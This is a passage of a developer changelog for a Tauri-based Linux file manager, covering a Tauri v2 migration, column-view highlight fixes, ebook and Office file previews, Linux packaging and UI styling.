2. `get_native_window_handle`: `Window` → `tauri::WebviewWindow`; `raw_window_handle()` → `window_handle()?.as_raw()`; `XcbWindowHandle.window` now `NonZeroU32` so `.get()` added; `WaylandWindowHandle.surface` now `NonNull` so `.as_ptr()` added
3. All five window-control commands (`window_minimize`, `window_maximize`, `window_close`, `window_set_fullscreen`, `window_is_maximized`): `Window` → `tauri::WebviewWindow`
4. `on_window_event` closure: v2 signature is `|window, event|` (separate args) vs v1 `|event|` (event wraps window)
5. `setup` block: `app.get_window("main")` → `app.get_webview_window("main")`; `tauri::Icon::Rgba { ... }` → `tauri::image::Image::new_owned(...)`
6. `tauri::Builder`: `.plugin(tauri_plugin_dialog::init())`, `.plugin(tauri_plugin_fs::init())`, `.plugin(tauri_plugin_shell::init())` registered before `.invoke_handler`

**JS frontend** (`src/main.js`, `src/views.js`, `src/ql-window.js`)
- `from '@tauri-apps/api/tauri'` → `from '@tauri-apps/api/core'`
- `from '@tauri-apps/api/dialog'` → `from '@tauri-apps/plugin-dialog'`
- `from '@tauri-apps/api/fs'` → `from '@tauri-apps/plugin-fs'`
- `import { appWindow } from '@tauri-apps/api/window'` → `import { getCurrentWindow as _getAppWindow } from '@tauri-apps/api/window'; const appWindow = _getAppWindow()`
- All `appWindow.` call-sites are unchanged — the `const appWindow` shim preserves all existing usage without touching any logic

**`package.json`**
- `@tauri-apps/api` `^1.6.0` → `^2.0.0`
- `@tauri-apps/cli` `^1.6.0` → `^2.0.0`
- Added: `@tauri-apps/plugin-dialog`, `@tauri-apps/plugin-fs`, `@tauri-apps/plugin-shell` as runtime dependencies

**`BUILD.md`**
- All `webkit2gtk-4.0` references updated to `webkit2gtk-4.1` (build and runtime)
- `webkit2gtk3-devel` (Fedora) → `webkit2gtk4.1-devel`
- `webkit2gtk` (Arch) → `webkit2gtk-4.1`
- Added Ubuntu 22.04+ minimum requirement note (4.1 not available on 20.04)
- Added Tauri v2 / Rust ≥ 1.77 requirement note

### Distro compatibility after this upgrade

| Distro | Minimum version | Status |
|--------|----------------|--------|
| Ubuntu / Debian | 22.04 Jammy + | ✅ supported |
| Ubuntu 20.04 Focal | — | ❌ dropped (no webkit2gtk-4.1) |
| Fedora | 37+ | ✅ supported |
| Arch / CachyOS | rolling (webkit2gtk-4.1 in extra) | ✅ supported |
| openSUSE Tumbleweed | rolling | ✅ supported |

---

## What's in Beta-5-r20

**Rust recompile required.** Changes in `src-tauri/src/main.rs` and `src/main.js`.

### Fix — Unused import warning: `std::io::Read` in `mobi_to_text` (`src-tauri/src/main.rs`)

`mobi_to_text` imported `std::io::Read` at the top of the function body. The function uses `fs::read()` which returns `Vec<u8>` directly and never calls any `Read` trait methods, so the import was dead code. Removed. Build now produces zero warnings.

---

### Fix — Column trail glitch persists on keyboard Right-arrow navigation (`src/main.js`)

**Root cause:** The r19 fix cleared `sel._paths` before `navigate()` in the *click handler*, but the keyboard ArrowRight handler (`state.viewMode === 'column'`) called `navigateDebounced()` without applying the same fix. Pressing Right to navigate into a folder still caused the selected row to show bright `.sel` during the streaming renders inside `navigateDebounced()` instead of the correct muted `.trail` highlight.

**Fix:** Applied the identical trail fix to the ArrowRight branch: `sel._paths.delete(en.path)` and `state.selIdx = -1` are now set immediately before `await navigateDebounced(...)`. All streaming renders inside the navigation now see `isSel = false → isTrail = true` from the very first frame, regardless of whether navigation was triggered by click or keyboard.

---

### Perf — `DIR_CACHE`: `Mutex` → `RwLock` for concurrent read access (`src-tauri/src/main.rs`)

**Root cause:** `DIR_CACHE` used a `Mutex<Option<DirCache>>`. Every `cache_get()` call — including ones fired concurrently from `list_directory_streamed` and `preload_dir` threads — acquired an exclusive write lock even for a pure read. With many columns open and multiple `preload_dir` threads in flight, these readers serialised each other, adding unnecessary latency to cache hits.

**Fix:** Changed `DIR_CACHE` to `RwLock<Option<DirCache>>`. `cache_get()` now takes a shared read lock (multiple callers hold it simultaneously with zero contention). `cache_insert()` and `cache_evict()` take the exclusive write lock, which is correct and rare. Read-path latency for cache hits is now fully parallel.

---

### Perf — `preload_dir`: raw OS thread → Tokio `spawn_blocking` (`src-tauri/src/main.rs`)

**Root cause:** `preload_dir` called `std::thread::spawn` per hover event. Hovering quickly over many directory rows (a natural motion when scanning column view) spawned N independent OS threads in rapid succession. OS thread creation costs ~100µs each and the thread pool is unbounded, so aggressive hovering could create dozens of threads simultaneously.

**Fix:** Switched to `tauri::async_runtime::spawn_blocking`. Tokio's blocking thread pool is bounded and reuses threads, so repeated hovers over many directories draw from an existing pool rather than paying OS thread creation cost each time. The work inside is identical; only the scheduling mechanism changes.

---

### Fix — App icon missing on native Wayland compositors (`src-tauri/src/main.rs`)

**Root cause:** The existing `win.set_icon(tauri::Icon::Rgba{...})` call sets the `_NET_WM_ICON` X11 window property. On **native Wayland** (Hyprland, Sway, GNOME, KDE Plasma under Wayland), most compositors do not read `_NET_WM_ICON` at all. Instead they resolve the taskbar/dock icon by matching the `xdg_toplevel` `app_id` (`"frostfinder"`) against installed `.desktop` files, then looking up `Icon=frostfinder` in the XDG hicolor icon theme at `~/.local/share/icons/hicolor/`. Without that icon installed, the compositor shows a generic placeholder.

**Fix:** Added a background thread in `setup()` (Linux only) that on first launch writes all bundled PNG sizes (16×16 through 512×512) to `~/.local/share/icons/hicolor/<size>/apps/frostfinder.png` and runs `gtk-update-icon-cache -f -t` on the hicolor tree. The thread is fire-and-forget and only writes files that don't already exist — subsequent launches are a no-op. The `set_icon()` call is retained for XWayland and X11 compatibility.

```
Icons installed on first launch:
  ~/.local/share/icons/hicolor/16x16/apps/frostfinder.png
  ~/.local/share/icons/hicolor/32x32/apps/frostfinder.png
  ~/.local/share/icons/hicolor/48x48/apps/frostfinder.png
  ~/.local/share/icons/hicolor/64x64/apps/frostfinder.png
  ~/.local/share/icons/hicolor/128x128/apps/frostfinder.png
  ~/.local/share/icons/hicolor/256x256/apps/frostfinder.png
  ~/.local/share/icons/hicolor/512x512/apps/frostfinder.png
```

After the first launch the icon appears in all Wayland-native taskbars, docks, app switchers, and application launchers without any manual installation step.

---

## What's in Beta-5-r19

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src/utils.js`, `src/views.js`, `src/ql-window.js`, `src/main.js`.

### Fix — Column trail glitch: clicking a folder still shows `.sel` during navigation (`src/views.js`)

**Root cause identified and definitively fixed.** The r10 fix placed `sel._paths.delete(entry.path)` *after* `await navigate()` resolved. This fixed the visual state *at the end* of navigation but not *during* it.

`navigate()` is async and emits streaming renders as it receives chunks from Rust (`list_directory_full_streamed`). Each streaming `render()` call goes through `renderColumnView` → `_patchEntries` for every existing column. At that point `sel._paths` still contained the clicked folder's path, so `isSel = sel.hasp(path) = true` → `isTrail = !isSel && ... = false`. Every streaming frame showed the clicked folder as bright `.sel` (selected) instead of muted `.trail` (navigated-through). The deletion at the end only fixed the *final* frame.

**Fix:** Move `sel._paths.delete(entry.path)` and `state.selIdx = -1` to *before* `await navigate(...)`. This means every render inside `navigate()` — including first-chunk and done-chunk streaming frames — already sees `isSel = false`, so `isTrail = true` fires immediately and the trail highlight is correct from the very first frame of navigation. The `col.selIdx` (set to `ei` before the navigate call) still correctly identifies which row index gets the `.trail` class.

```js
// Before (r10): delete AFTER navigate — streaming renders during nav still showed .sel
await navigate(entry.path, liveCI + 1, false);
if (state.columns.length > liveCI + 1) {
  sel._paths.delete(entry.path);
  state.selIdx = -1;
  render();
}

// After (r19): delete BEFORE navigate — all renders inside nav see correct trail
sel._paths.delete(entry.path);
state.selIdx = -1;
await navigate(entry.path, liveCI + 1, false);
```

---

### Feature — epub / mobi / azw / azw3 preview in panel, gallery, and Quick Look

#### Rust: text extraction (`src-tauri/src/main.rs`)

**`epub_to_text(path)`** — ePub 2/3 (ZIP + XHTML). Reads `META-INF/container.xml` to locate the OPF manifest, parses the spine order from `<itemref>` elements, builds an `id→href` map from `<item>` entries, then reads each XHTML content document in spine order. Strips HTML tags, maps block elements (`<p>`, `<div>`, `<h1>`–`<h6>`, `<li>`, `<br>`) to newlines, decodes XML/HTML entities, collapses blank lines. Falls back to finding all `.xhtml`/`.html` files in the ZIP if OPF parsing fails. Capped at 256 KB.

**`mobi_to_text(path)`** — Mobipocket / AZW / AZW3 (proprietary binary). Scans the raw binary for the HTML payload (looks for `<html`, `<body`, `<p` markers after the PalmDOC record header), extracts and lossily UTF-8-decodes up to 512 KB of content, strips HTML tags with block-element newline conversion, filters garbage bytes. Returns `None` if extracted text is fewer than 50 characters (indicating the file is not parseable by this method — e.g. DRM-encrypted AZW3). No external crates added.

Both wired into `get_file_preview` returning `is_text: true` with the extracted content. The existing `<pre class="preview-code">` render path handles display automatically.

New MIME types: `application/epub+zip` for epub, `application/x-mobipocket-ebook` for mobi/azw/azw3.

#### JS: new `BOOK_EXTS` constant and wiring

**`src/utils.js`**
- `BOOK_EXTS = ['epub','mobi','azw','azw3']` — new export
- `fileColor`: ebooks → `#fb923c` (orange, distinct from docs)
- `fileIcon`: ebooks → `getIcon('doc')`
- `mimeLabel`: `'application/epub+zip': 'ePub Book'`, `'application/x-mobipocket-ebook': 'Mobipocket Book'`

**`src/views.js`** — `BOOK_EXTS` added to import; gallery `_buildMainHtml` and `_loadContent` doc-slot guards; `_qlBody` `isDoc` check.

**`src/ql-window.js`** — `BOOK_EXTS` added to import and `isDoc` check in `renderEntry`.

**`src/main.js`** — `BOOK_EXTS` added to import.

---

## What's in Beta-5-r18

**Rust recompile required** (warning fixes). JS changes in `src/ql-window.js` and `src/views.js`.

### Fix — doc/docx/xls/xlsx not showing in preview panel or Quick Look (`src/ql-window.js`, `src/views.js`)

**Root cause:** Two `isDoc` checks that route files to the text-preview slot only checked `DOC_EXTS` (plain text formats: md, txt, rs, py, etc.) but not `OFFICE_EXTS` (doc, docx, xls, xlsx). Office files therefore fell through to the `renderUnknown` branch, showing only the file icon and size instead of extracted text.

**Fix 1 — `src/ql-window.js` `renderEntry()`:**
```js
// Before:
const isDoc = DOC_EXTS.includes(ext);
// After:
const isDoc = DOC_EXTS.includes(ext) || OFFICE_EXTS.includes(ext);
```
Also added `OFFICE_EXTS` to the import from `utils.js`. Office files now route to the `isDoc` branch which calls `get_file_preview` and renders the extracted text in a `<pre>` element — identical to how plain text docs are shown in Quick Look.

**Fix 2 — `src/views.js` `_qlBody()`** (the inline Quick Look overlay used in list/column view):
```js
// Before:
const isDoc = DOC_EXTS.includes(ext);
// After:
const isDoc = DOC_EXTS.includes(ext) || OFFICE_EXTS.includes(ext);
```

The gallery view (`_buildMainHtml`, `_loadContent`) and main preview panel (`renderPreview` via `is_text` response) were already correct from r17 — only these two QL code paths were missed.

---

### Fix — Rust compiler warnings in `xlsx_to_text` (`src-tauri/src/main.rs`)

Two warnings emitted during build:
- `variable does not need to be mutable: mut in_si`
- `unused variable: in_si`

**Root cause:** The shared strings parser in `xlsx_to_text` had two approaches written simultaneously: a character-by-character loop (incomplete, never produced any output — `in_t` was declared but never set to `true`) and a `split("<si>")` boundary parser below it that did the actual work correctly. The char loop was dead code with two unused variables (`in_t` set but never read for actual accumulation, `in_si` declared but never used at all).

**Fix:** Removed the dead char loop entirely. The `split("<si>")` parser is the sole shared-strings implementation and works correctly. No functional change — the actual xlsx text extraction output is identical.

---

## What's in Beta-5-r17

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src-tauri/tauri.conf.json`, `src/utils.js`, `src/views.js`, and `src/main.js`.

### Fix — PDF preview blank in production builds (`src-tauri/tauri.conf.json`)

**Root cause:** The CSP (Content Security Policy) lacked a `frame-src` directive. In dev mode (`npm run tauri dev`), the app is served by the Vite HTTP dev server and the browser barely enforces the CSP. In production builds (`npm run tauri build`), Tauri serves the app from the custom `tauri://localhost` protocol and enforces the full CSP — any `<iframe>` attempting to load content from `http://127.0.0.1:PORT/...` was silently blocked, rendering a blank white or grey rectangle where the PDF should appear. The media server was running and reachable; only the iframe embed was blocked.

**Fix:** Added `frame-src http://127.0.0.1:*;` to the CSP string:

```
"csp": "... frame-src http://127.0.0.1:*; ..."
```

This unblocks all iframes loading from the local media server — PDFs in the preview panel, gallery PDF slot, Quick Look PDF slot, and HTML file previews (`<iframe sandbox>`) are all now permitted in production builds.

---

### Feature — doc / docx / xls / xlsx preview (`src-tauri/src/main.rs`, `src/utils.js`, `src/views.js`, `src/main.js`)

#### Rust: text extraction (`src-tauri/src/main.rs`)

**`docx_to_text(path: &Path) -> Option<String>`** — Extracts readable text from `.docx` (and `.doc` saved in OOXML format). Opens the file as a ZIP archive, reads `word/document.xml`, strips all XML tags, converts `<w:p>` paragraph boundaries to newlines, decodes `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&apos;` entities, and collapses excess blank lines. Uses the `zip` crate already present in `Cargo.toml`.

**`xlsx_to_text(path: &Path) -> Option<String>`** — Extracts cell content from `.xlsx` (and `.xls` saved in OOXML format). Opens the file as a ZIP archive, reads the shared string table from `xl/sharedStrings.xml` (where most text content lives), then reads `xl/worksheets/sheet1.xml` to walk rows and cells. Handles shared-string references (`t="s"`), inline strings (`t="inlineStr"`), and numeric/formula values. Outputs tab-separated values with one row per line. Capped at 200 rows to keep preview fast for large spreadsheets.

Both functions are wired into `get_file_preview()` before the existing `is_image` and `is_text` paths. When extraction succeeds, Rust returns `is_text: true` with the extracted content — the existing `<pre class="preview-code">` render path in the JS preview panel handles it automatically. When extraction fails (e.g. a legacy binary `.doc`/`.xls` that is not OOXML), Rust returns `is_text: false` and the preview panel shows the standard binary fallback with icon and mime label.

Also added MIME types for both formats to `get_file_preview`: `application/msword` for doc/docx, `application/vnd.ms-excel` for xls/xlsx.

#### JS: file type wiring (`src/utils.js`, `src/views.js`, `src/main.js`)

**`src/utils.js`**
- New `OFFICE_EXTS = ['doc','docx','xls','xlsx']` export — used across views to route office files to the text-preview slot
- `fileColor`: `doc`/`docx` → `#5b8dd9` (Word blue); `xls`/`xlsx` → `#34d399` (Excel green, consistent with CSV)
- `mimeLabel`: added `'application/msword': 'Word Document'` and `'application/vnd.ms-excel': 'Excel Spreadsheet'`
- `fileIcon`: `doc`/`docx`/`xls`/`xlsx` → `getIcon('doc')` — document icon with correct color from above

**`src/views.js`**
- `OFFICE_EXTS` imported from `utils.js`
- Gallery `_buildMainHtml`: `DOC_EXTS.includes(ext) || OFFICE_EXTS.includes(ext)` — both show the `#gallery-doc-slot` which loads via `get_file_preview` and renders the extracted text
- Gallery `_loadContent`: same guard ensures the doc slot fires for office files

**`src/main.js`**
- `OFFICE_EXTS` added to the import from `utils.js`
- `loadPreview` already calls `get_file_preview` for all non-image/non-media files — office files automatically go through the Rust extraction path with no extra routing needed

---

## What's in Beta-5-r16

**No Rust recompile required.** Changes in `src-tauri/tauri.conf.json` and `BUILD.md` only.

### Fix — Fedora `.rpm` install fails: wrong package names in `rpm.depends` (`src-tauri/tauri.conf.json`)

Two wrong package names in the RPM `depends` block caused `dnf install` to abort with depsolve errors.

**`webkit2gtk4.0` → `webkit2gtk3`**

`webkit2gtk4.0` does not exist universally across Fedora releases. The package that provides `libwebkit2gtk-4.0.so.37()(64bit)` — the exact shared library Tauri v1 links against — on every supported Fedora version is `webkit2gtk3`. This resolves the install on all Fedora releases (36 through 40+).

**`libayatana-appindicator` → removed**

This package does not exist in Fedora's repos at all — it is Ubuntu/Debian-specific. It is also not needed: `Cargo.toml` has `features = ["shell-open"]` with no `system-tray` or `ayatana-tray` feature, so appindicator is never linked. Also removed the Ubuntu equivalent `libayatana-appindicator3-1` from `deb.depends` for the same reason.

`BUILD.md` — Fedora build dep corrected to `webkit2gtk3-devel`, `libayatana-appindicator-devel` removed.

---

## What's in Beta-5-r15

**Rust recompile required.** Fix in `src-tauri/src/main.rs` only.

### Fix — `Icon::Raw` compile error → correct `Icon::Rgba` variant (`src-tauri/src/main.rs`)

r14 used `tauri::Icon::Raw(Vec<u8>)` which does not exist in Tauri v1. The correct variant is `tauri::Icon::Rgba { rgba: Vec<u8>, width: u32, height: u32 }` which requires the raw RGBA pixel bytes and explicit image dimensions.

**Fix:** Decode the embedded PNG with the `image` crate (already a dependency, PNG feature already enabled) to get the pixel data and dimensions:

```rust
const ICON_PNG: &[u8] = include_bytes!("../icons/128x128.png");
if let Ok(img) = image::load_from_memory(ICON_PNG) {
    let rgba = img.into_rgba8();
    let (width, height) = rgba.dimensions();
    let _ = win.set_icon(tauri::Icon::Rgba {
        rgba: rgba.into_raw(),
        width,
        height,
    });
}
```

`image::load_from_memory` is already called elsewhere in `main.rs` (thumbnail generation) so no new imports are needed. `img.into_rgba8()` converts any pixel format (including indexed or grayscale PNGs) to the packed `u8` RGBA layout that `tauri::Icon::Rgba` requires. `rgba.dimensions()` returns `(width, height)` as `u32` matching the struct fields exactly.

---

## What's in Beta-5-r14

**Rust recompile required.** Change in `src-tauri/src/main.rs` only.

### Fix — Taskbar / dock shows generic "F" letter instead of app icon (`src-tauri/src/main.rs`)

**Root cause:** Tauri v1 does **not** automatically set `_NET_WM_ICON` on the live window. `_NET_WM_ICON` is the X11/Wayland window property that taskbars, alt-tab switchers, and docks read to display the app icon. Without it, every window manager falls back to a text placeholder derived from the window title — hence the "F" initial shown in the taskbar. This is a known Tauri v1 limitation; the bundle icons in `tauri.conf.json` are only used when generating `.desktop` files and package metadata, not for the running window itself.

**Fix:** Added a `win.set_icon()` call at the top of the `.setup()` closure:

```rust
if let Some(win) = app.get_window("main") {
    let _ = win.set_icon(tauri::Icon::Raw(
        include_bytes!("../icons/128x128.png").to_vec()
    ));
}
```

`include_bytes!("../icons/128x128.png")` embeds the PNG directly into the compiled binary at build time — zero runtime filesystem reads, works identically whether the app is run as a raw binary, from a `.deb`/`.rpm`/`.AppImage` install, or via `npm run tauri dev`. `tauri::Icon::Raw` decodes the PNG and passes the pixel data to the underlying GTK/Wayland window, which sets `_NET_WM_ICON`. All taskbars, docks, and window switchers that read this property will now show the FrostFinder icon immediately on launch.

The 128×128 size is used as the source; the window manager rescales to whatever size it needs for the dock or taskbar slot.

---

## What's in Beta-5-r13

**No Rust recompile required.** Changes in `src-tauri/tauri.conf.json`, `src-tauri/icons/` (new sizes), `packaging/frostfinder.desktop` (new), `PKGBUILD` (new), `BUILD.md` (new). Also adds `packaging/` and new icon size PNGs to the zip.

### Feature — Full Linux packaging: Ubuntu `.deb`, Fedora `.rpm`, portable `.AppImage`, AUR `PKGBUILD`

Running `npm run tauri build` now produces all three Linux bundle formats in one pass. A `PKGBUILD` for AUR is included. Icons are properly sized and installed across the hicolor theme tree.

---

**`src-tauri/tauri.conf.json` — Build targets and metadata**

`targets` changed from `["deb", "rpm", "nsis", "msi", "dmg"]` to `["deb", "rpm", "appimage"]`. Windows (NSIS/MSI) and macOS (DMG) removed from the default target list — the Linux-only targets now build without errors on a Linux host. Run `npm run tauri build -- --bundles deb` to build a single format if needed.

Added package metadata used by all three formats:
- `shortDescription` / `longDescription` — shown in package managers
- `category` — `"Utility"` maps to the XDG `Utility;FileManager;` categories
- `copyright` — embedded in `.deb` control and `.rpm` spec

`.deb` now lists `udisks2` as a dependency (required for ISO/DMG/USB one-click mount). `.rpm` lists the correct Fedora package names (`webkit2gtk4.0` not `libwebkit2gtk-4.0-37`).

`appimage.bundleMediaFramework` is `false` — the AppImage must not bundle WebKit2GTK or GStreamer; it depends on the system stack for VA-API hardware decode and correct media handling. The env vars `APPIMAGE_EXTRACT_AND_RUN=1` and `NO_STRIP=1` in `.cargo/config.toml` handle Arch/CachyOS AppImage toolchain quirks automatically.

---

**`src-tauri/icons/` — Complete hicolor size set**

Added `16x16.png`, `48x48.png`, `64x64.png`, `256x256.png`, `512x512.png` — all generated from the existing `128x128@2x.png` (256px source) using LANCZOS resampling. All standard XDG hicolor sizes are now present so desktop environments display the correct icon at any size without upscaling artefacts. The `icon` array in `tauri.conf.json` lists all sizes so Tauri embeds them in every bundle format.

---

**`packaging/frostfinder.desktop` — Linux desktop entry (new)**

Standard XDG `.desktop` file for launcher/taskbar/application-menu integration. Includes `Categories=Utility;FileManager;`, `MimeType=inode/directory;` (registers as a default file manager candidate), `StartupWMClass=frostfinder` (taskbar grouping), and `Keywords` for desktop search.

Used by:
- The `PKGBUILD` (`makepkg`) installs it to `/usr/share/applications/`
- Packagers can also install it manually: `install -Dm644 packaging/frostfinder.desktop /usr/share/applications/frostfinder.desktop`

---

**`PKGBUILD` — AUR packaging (new)**

Full `makepkg`-compatible PKGBUILD. Declares correct `depends`/`makedepends`/`optdepends`, runs `npm install` + `npm run tauri build` in the `build()` step, and installs binary + all icon sizes + `.desktop` file in `package()`. Includes a commented local-development variant for building directly from the project directory without a real source tarball.

Usage:
```bash
# Requires base-devel, rust, nodejs, npm, and the webkit2gtk/gtk3 build deps
makepkg -si
```

---

**`BUILD.md` — Full build instructions (new)**

Step-by-step build guide for Ubuntu/Debian, Fedora/RHEL, and Arch/CachyOS. Covers system build dependencies, per-format build commands (`--bundles deb`, `--bundles rpm`, `--bundles appimage`), install commands, AppImage FUSE notes, optional runtime tools (ffmpeg, mpv, udisks2, libheif), and manual icon installation for packagers who don't use the PKGBUILD.

---

## What's in Beta-5-r12

**No Rust recompile required.** Full line-by-line code audit. One bug fixed in `src/views.js`.

### Audit — Full codebase review

Every line of `src/views.js` (3249 lines), `src/main.js` (2552 lines), `src/ql-window.js` (630 lines), `src/utils.js`, `src/style.css`, `src-tauri/src/main.rs` (3659 lines), and all config files was reviewed.

**All 79 Tauri commands confirmed registered** in `invoke_handler` with none missing or unregistered. All previously fixed mechanisms verified intact: r7 live-DOM `_patchEntries` trail fix, r10 post-navigate `sel._paths.delete` trail fix, r5 multi-path `watch_dir`, r6 `delete_items_stream`, `empty_trash_stream`, `_sbProgress`, `_toolbarFp`, `_jsCacheEvict`/`_jsCacheSet`, `_watcherRefreshPending`. No stale Tauri API calls to removed commands (`delete_file`, `burn_iso`, `list_optical_drives`). Dead-code functions (`is_xcf_ext`, `is_html_ext`, `is_dmg_ext`) confirmed absent from `main.rs`.

---

### Fix — List view scroll position reset to top on every click and right-click (`src/views.js`)

**Root cause:** After `handleEntryClick(entry, i, ev)` is called from the list view click handler, it calls `render()`, which calls `renderListView(host)`, which executes `host.innerHTML = '...'` — rebuilding the entire list view DOM from scratch. This detaches the old `#lv-wrap` element. Both `requestAnimationFrame` callbacks still referenced the captured-at-build-time `lvWrap` variable, which now pointed to the detached element. Setting `scrollTop` on a detached element is a browser no-op (silently ignored). The same issue existed in the `contextmenu` handler's RAF. Result: every click or right-click in list view reset the scroll position to the top of the list.

**Why this wasn't previously reported:** The bug exists on every list view click, but it's most noticeable when selecting items in the middle of a long directory. For short directories or when clicking near the top, the position jump is imperceptible. It was consistent and silent.

**Fix:** Both RAFs now use `host.querySelector('#lv-wrap')` to find the newly-created `#lv-wrap` element produced by the rebuild, rather than the stale captured reference:

```js
// Before — targets detached element, silently no-ops:
requestAnimationFrame(() => { if (lvWrap) lvWrap.scrollTop = sv; });

// After — queries the live #lv-wrap in the rebuilt DOM:
requestAnimationFrame(() => { const lw = host.querySelector('#lv-wrap'); if (lw) lw.scrollTop = sv; });
```

`host` (`#view-host`) is the stable container element that `renderListView` receives as a parameter and writes into — it is never replaced, only its `innerHTML` is. It is therefore always a valid, connected DOM element to query from. Applied to both the `click` handler and the `contextmenu` handler RAFs.

---

## What's in Beta-5-r11

**No Rust recompile required.** Changes in `src/style.css` only.

### Feature — Full modern UI overhaul: unified radius scale, glass popups, layered shadows (`src/style.css`)

Complete visual redesign of the entire app. Every surface, popup, dialog, and interactive element has been updated to a coherent modern dark design language.

---

**Radius scale** — CSS variables `--r-xs` through `--r-xl` now drive all border-radius values consistently instead of scattered ad-hoc pixel values:

| Variable | Value | Used for |
|---|---|---|
| `--r-xs` | 4px | Tiny elements: badges, dots, close buttons |
| `--r-sm` | 8px | Buttons, rows, small interactive items |
| `--r-md` | 12px | Inputs, cards, image thumbnails |
| `--r-lg` | 16px | Dropdowns, context menus, sort popup |
| `--r-xl` | 20px | Full modals: permission dialog, Open With |

**Shadow scale** — `--shadow-sm` / `--shadow-md` / `--shadow-lg` / `--shadow-xl` provide layered depth. All floating elements (context menus, dropdowns, dialogs) now use the appropriate tier with inset highlight line for depth.

---

**Main window** — Added `border-radius:12px` and `border:1px solid rgba(255,255,255,.1)` to `.window`. Since `transparent:true` is already set in `tauri.conf.json`, this gives the app window itself rounded corners against the desktop wallpaper — the same effect as macOS apps and modern Linux tools.

**All glass popups** — Context menu, sort popup, new-file dropdown, permission dialog, Open With dialog all now use `backdrop-filter:blur(24-32px)` with semi-transparent backgrounds (`rgba(36,36,40,.92-.97)`). They float visually above the rest of the UI with clear depth separation.

**Context menu** — `border-radius:16px`, glass background, `--shadow-xl`. Row hover radius `10px`.

**Sort popup** — `border-radius:16px`, glass background, `--shadow-lg`.

**New-file dropdown** — `border-radius:16px`, glass background, deeper shadow.

**Permission dialog** — `border-radius:20px`, glass background, `--shadow-xl`. Buttons now `border-radius:10px`. Cancel button has explicit `background:rgba(255,255,255,.05)` so it reads as a distinct control.

**Open With dialog** — `border-radius:20px`, glass background, `--shadow-xl`. Search input `border-radius:10px` with focus ring. App rows `border-radius:10px`.

**Toast notifications** — `border-radius:12px`, `backdrop-filter:blur(12px)`, tinted border matching toast color. Elevated shadow for clear floating feel.

**Lightbox close button** — Added `backdrop-filter:blur(8px)` so it reads clearly over any image.

**Breadcrumb input** — `border-radius:12px` with focus glow ring `box-shadow:0 0 0 3px rgba(91,141,217,.15)`.

**Search input** — `border-radius:10px` with matching focus ring.

**View switcher** — `border-radius:10px` container with `border:1px solid rgba(255,255,255,.06)`.

**Tags** — All tag pills are now fully rounded (`border-radius:20px`) — pill shape throughout preview panel, context menu, and row badges.

**Gallery thumbnails (`.gthumb`)** — `border-radius:10px`, inner image top radius `6px 6px 0 0` matches.

**Icon items (`.icon-item`)** — `border-radius:10px`, `ico-big border-radius:12px`.

**ISO/DMG action buttons** — `border-radius:10px` for a more modern card-button look.

**Font install button** — `border-radius:10px`.

**Font specimen card** — `border-radius:10px` with matching border.

---

## What's in Beta-5-r10

**No Rust recompile required.** Changes in `src/views.js` only.

### Fix — Column 5+ folder clicks glitch: trail shows `.sel` instead of `.trail` after click (`src/views.js`)

Two compounding bugs caused mouse clicks in any parent column to display the wrong highlight state on the clicked folder, while arrow-key navigation showed the correct `.trail` highlight. Confirmed by debug log `frostfinder-debug-1773576167449.log` showing repeated ci=4 and ci=5 clicks with correct navigation but wrong visual state.

---

**Bug 1 — `_makeColRow` used build-time `ci` for `isTrail` (same category as r7 fix)**

`_makeColRow` is called from `_paintColList` every time new rows enter the virtual-scroll viewport (scrolling, resize, or full rebuild). The `isTrail` check was:

```js
const isTrail = !isSel && (ci < state.columns.length - 1) && col.selIdx === ei;
```

`ci` is captured at column build time. `_paintColList` runs independently from `render()` — scroll events and `ResizeObserver` callbacks fire asynchronously. Between the time a column is built and the time `_paintColList` runs, `state.columns.length` may have changed (due to navigations and watcher events). Using the build-time `ci` against the live `state.columns.length` gives the wrong `isParent` result.

**Fix:** Compute the live column index from the DOM position at the time `_makeColRow` runs — exactly the same strategy used by `_patchEntries` (r7 fix) and the click handler (r7 fix):

```js
const _rowLiveCI = colEl.parentElement
  ? Array.from(colEl.parentElement.children).indexOf(colEl)
  : ci; // fallback only if somehow detached
const isTrail = !isSel && (_rowLiveCI !== -1) && (_rowLiveCI < state.columns.length - 1) && col.selIdx === ei;
```

---

**Bug 2 — After clicking a directory to navigate into it, `sel._paths` still contains that folder's path**

This is the primary cause of the "click glitch vs arrow keys work fine" asymmetry.

**Root cause:** The click handler calls `sel.set(ei)` which adds the clicked folder to `sel._paths`. Navigate then opens the child column. In every render inside `navigate()` (streaming renders), `isSel = sel.hasp(entry.path) = true` for the clicked folder. `isTrail = !isSel && ... = false`. The folder shows `.sel` (bright blue) instead of `.trail` (muted blue).

**Why arrow keys work:** Arrow-key navigation moves selection *inside the child column* — `sel.set(child_idx)` replaces `sel._paths` with a child column item. Now `sel.hasp(parent_folder_path) = false` → `isTrail = true` → `.trail` shown correctly.

**Fix:** After `navigate()` resolves and the child column is confirmed open, remove the navigated folder's path from `sel._paths`. `col.selIdx` (set during the click) still tracks which row gets the trail.

```js
await navigate(entry.path, liveCI + 1, false);
if (state.columns.length > liveCI + 1) {
  sel._paths.delete(entry.path);
  state.selIdx = -1;
  render();
}
```

The guard `state.columns.length > liveCI + 1` ensures we only do this when the child column actually opened (i.e., navigate didn't fail silently). The `sel._paths.delete` is surgical — it removes only the navigated folder, leaving any multi-selection context in other columns intact.

---

## What's in Beta-5-r9

**No Rust recompile required.** Changes in `src/views.js`, `src/style.css`.

### Feature — Column view navigation trail (`src/views.js`, `src/style.css`)

When navigating into subdirectories in column view, each parent column now shows a persistent highlight on the folder that leads to the next column — matching macOS Finder's column trail behaviour.

**Before:** Parent columns showed no visual indicator of the navigation path. Once you clicked a file in a deep column, all parent-column highlights vanished. Finding your position required scanning every column individually.

**After:** Every folder in the active navigation path is highlighted with a muted blue `.frow.trail` background. The selected item in the rightmost column retains the full bright `.frow.sel` blue so the endpoint stays visually dominant. The complete path from the leftmost column to the current selection is visible at a glance.

**Root cause of why this was silently broken before:** `_makeColRow` used `sel.hasp(e.path) || col.selIdx === ei` for `isSel`, which marked trail folders correctly on first column build — but columns are almost always *patched* rather than rebuilt via `_patchEntries`. Both `_patchEntries` fast-paths only checked `sel.hasp(e.path)` and never `col.selIdx`, so trail folders lost their highlight silently on every watcher event, render cycle, or navigation after the initial build.

**Implementation details:**

